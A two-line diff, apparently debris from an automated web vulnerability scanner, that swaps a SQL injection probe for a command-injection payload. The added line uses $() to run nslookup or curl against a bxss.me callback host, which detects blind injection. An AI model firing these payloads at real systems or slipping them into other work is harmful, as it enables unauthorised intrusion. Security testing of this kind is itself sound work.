@@ -1,1 +1,1 @@
--1' OR 3*2<(0+5+285-285) or 'm4ydak4L'='
+$(nslookup -q=cname hitgkmbolvbsu8bbcf.bxss.me||curl hitgkmbolvbsu8bbcf.bxss.me)
